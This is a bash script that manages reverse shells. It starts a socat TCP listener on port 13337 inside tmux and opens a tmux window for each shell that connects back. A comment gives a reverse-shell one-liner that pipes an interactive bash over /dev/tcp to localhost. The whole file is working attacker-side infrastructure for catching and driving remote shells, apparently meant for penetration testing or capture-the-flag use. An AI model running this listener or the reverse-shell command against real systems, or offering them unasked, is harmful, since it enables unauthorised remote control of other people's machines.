#!/bin/bash
#
# tmux-based reverse shell manager.
# Prerequisites must be in $PATH:
#   - sling-input
#   - sling-watch
#   - sling-catch
#   - socat
#   - tmux
#
#
# Usage:
#   sling-shell.sh [session_name [port]]
#
# Test with:
#   $ bash -c "bash -i >& /dev/tcp/localhost/13337 0>&1 &"

set -e

# defaults
SESSION=shell
PORT=13337

main() {
  # start session with socat listener in background
  if ! tmux has-session -t "$SESSION" 2>/dev/null
  then
    tmux new-session -s "$SESSION" -d -- socat -d -d TCP4-LISTEN:"$PORT",fork,reuseaddr EXEC:sling-input,nofork \; \
      set remain-on-exit failed \; 
  fi

  #trap 'kill $(jobs -p); tmux kill-session -t "$SESSION" 2>/dev/null' EXIT

  # watch for new sockets in background and open windows with them
  sling-watch |while read sock; do
    tmux new-window -t "$SESSION" -n '' -d -- sling-catch -c -N -s "$sock" -- socat FD:5 STDIO
  done &

  # attach session to foreground
  tmux attach-session -t "$SESSION"
}

usage() {
  (
    echo "usage: $0 [-s session_name] [-p port]"
    echo ""
    echo "  defaults:"
    echo "    -s $SESSION"
    echo "    -p $PORT"
    echo ""
  ) 1>&2
  exit 1
}

process_options() {
  while getopts ":hp:s:" opt; do
    case "$opt" in
      s)
	SESSION="$OPTARG"
	;;
      p)
	PORT="$OPTARG"
	;;
      h)
	usage
	;;
      \?)
	echo "unknown option: -$OPTARG" 1>&2
	usage
	;;
      :)
	echo "-$OPTARG: argument required" 1>&2
	exit 1
	;;
    esac
  done
  shift $((OPTIND-1))

  if (($#)); then
    usage
  fi
}

process_options "$@"
main
